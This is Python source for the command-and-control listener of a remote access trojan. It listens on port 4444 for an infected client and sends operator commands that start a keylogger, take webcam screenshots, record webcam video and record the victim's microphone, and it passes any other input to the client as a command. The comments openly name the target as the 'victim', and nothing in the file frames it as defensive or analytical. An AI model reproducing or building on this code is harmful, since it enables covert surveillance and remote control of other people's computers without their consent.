import socket

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
ip='192.168.2.2'
port=4444



def conn(ip,port):
    s.bind((ip,port))

    print("listening...")

    s.listen(1)
    client,addr=s.accept()

    while(1):
        data=client.recv(1024)
        print(data.decode('utf-8'))
        usr=input("command>")
        if(usr=='1'):
            print('[*] keylogger started')
            client.send(usr.encode('utf-8')) 
            import module_server_keylogger
            module_server_keylogger.server_keylogger()       
        elif(usr=='4'):
            print('[*] grabbing screenshot from victim webcam')
            client.send(usr.encode('utf-8'))
            import module_webcam_screenshot_server
            module_webcam_screenshot_server.photo_capture()    
        elif(usr=='5'):
        	print('[*] enabling video capture from victim webcam')
        	client.send(usr.encode('utf-8'))
        	import webcam_video_server
        	webcam_video_server.video_capture()
        elif(usr=='6'):
        	print('[*] recording victims mic')
        	
        	client.send(usr.encode('utf-8'))
        	data2=client.recv(1024)
        	print(data2.decode('utf-8'))
        	sec=input('seconds:')
        	client.send(sec.encode('utf-8'))
        	
        	import audio_server
        	audio_server.audio_capture()
        else:
            client.send(usr.encode('utf-8'))
        
conn(ip,port)
